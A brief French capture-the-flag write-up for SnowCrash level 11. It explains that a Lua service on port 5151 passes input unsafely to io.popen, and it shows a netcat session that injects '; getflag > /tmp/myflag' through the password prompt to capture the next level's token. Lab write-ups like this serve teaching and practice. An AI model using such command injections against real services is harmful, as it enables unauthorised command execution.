# Level11

Le script lua présent sur le home est un serveur servi sur le port 5151, qui éxécute une fonction non sécurisé de lua, à savoir `io.popen`.

Nous tentons une connexion avec netcat et entrons une injection simple avec la string `; getflag > /tmp/myflag`

```bash
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: ; getflag > /tmp/myflag
Erf nope..
```

Nous obtenons le flag du niveau suivant:

```bash
level11@SnowCrash:~$ cat /tmp/myflag
Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXX
```